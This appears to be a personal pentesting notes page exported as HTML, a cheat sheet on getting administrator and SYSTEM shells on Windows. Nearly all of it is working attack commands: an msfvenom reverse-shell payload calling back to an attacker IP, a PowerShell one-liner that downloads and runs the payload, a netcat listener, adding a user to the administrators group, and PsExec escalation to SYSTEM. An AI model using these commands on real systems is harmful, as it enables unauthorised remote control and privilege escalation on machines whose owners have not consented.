<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>How spawn Administrator Shells</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>How spawn Administrator Shells</h1><br /><strong>• msfvenom</strong><br /> If we can execute
    commands with admin privileges, a reverse shell generated by msfvenom works nicely:<br />
    <div class="codebox">
      <div class="codebox">
        attacker@kali:/#&nbsp;msfvenom&nbsp;-p&nbsp;windows/x64/shell_reverse_tcp&nbsp;LHOST=192.168.1.11&nbsp;LPORT=53&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;reverse.exe<br />attacker@kali:/#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer
      </div>
    </div><br /> This reverse shell can be caught using netcat or Metasploit’s own multi/handler.<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(New-Object&nbsp;System.Net.WebClient).downloadfile(&#39;http://192.168.147.139/reverse.exe&#39;,&#39;C:\Users\ckent\Desktop\reverse.exe&#39;);<br />PS&gt;&nbsp;C:\Users\ckent\Desktop\reverse.exe
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">attacker@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div><br /> <a href=""><img src="images/1317-1.png" alt="images/1317-1.png" /></a><br /><strong>•
      RDP</strong><br /> Alternatively, if RDP is available (or we can enable it), we can add our low privileged user to
    the administrators group and then spawn an administrator command prompt via the GUI.<br />
    <div class="codebox">
      <div class="codebox">PS&gt;&nbsp;net&nbsp;localgroup&nbsp;administrators&nbsp;&lt;username&gt;&nbsp;/add</div>
    </div><br /><strong>• Admin -&gt; SYSTEM</strong><br /> To escalate from an admin user to full SYSTEM privileges,
    you can use the PsExec tool from Windows Sysinternals (<a
      href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a>).<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;.\PsExec64.exe&nbsp;-a&nbsp;accepteula&nbsp;-i&nbsp;-s&nbsp;C:\PrivEsc\reverseShellGenerateWithMsfvenom.exe
      </div>
    </div>
  </div>
</body>

</html>